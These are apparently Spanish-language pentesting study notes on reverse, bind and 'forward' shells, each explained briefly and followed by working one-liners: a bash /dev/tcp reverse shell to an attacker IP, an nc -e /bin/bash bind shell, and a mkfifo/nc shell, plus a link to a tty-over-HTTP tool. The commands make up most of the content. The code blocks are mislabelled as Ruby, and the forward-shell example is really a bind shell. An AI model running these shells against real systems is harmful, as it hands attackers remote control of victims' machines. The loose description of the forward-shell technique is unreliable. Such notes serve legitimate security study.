# Reverse Shell (Conexión Inversa)

- Esta técnica permite a un atacante conectarse a una máquina remota desde su propia máquina. Establece una conexión desde la máquina comprometida hacia la máquina del atacante. Esto se logra ejecutando un programa malicioso o una instrucción específica en la máquina remota que establece una conexión de regreso hacia la máquina del atacante, permitiéndole tomar control de la máquina remota.

```ruby
# En la máquina del atacante (IP: 192.168.1.100)
nc -lvnp 4444

# En la máquina de la víctima
bash -i >& /dev/tcp/192.168.1.100/4444 0>&1

```

# Blind Shell (Conexión Directa)

- Esta técnica es lo opuesto a una Reverse Shell. En lugar de que la máquina comprometida se conecte a la máquina del atacante, el atacante se conecta a la máquina comprometida. El atacante escucha en un puerto específico, y la máquina comprometida acepta la conexión entrante en ese puerto. El atacante entonces tiene acceso a la consola de la máquina comprometida, permitiéndole tomar control de ella.

```ruby
# En la máquina de la víctima
nc -lvnp 4444 -e /bin/bash

# En la máquina del atacante
nc 192.168.1.200 4444
```

# Forward Shell (Conexión Redirigida)

- Esta técnica se utiliza cuando no se pueden establecer conexiones inversas o directas debido a las reglas del Firewall implementadas en la red. Se logra utilizando mkfifo, que crea un archivo FIFO (tubería con nombre) que se usa como una especie de "consola simulada" a través de la cual el atacante puede operar en la máquina remota. En lugar de establecer una conexión directa, el atacante redirige el tráfico a través del archivo FIFO, permitiendo una comunicación bidireccional con la máquina remota.

```ruby
# En la máquina de la víctima
mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l 4444 > /tmp/f

# En la máquina del atacante
nc 192.168.1.200 4444

``` 

## Enlace

```ruby
https://github.com/s4vitar/ttyoverhttp
```
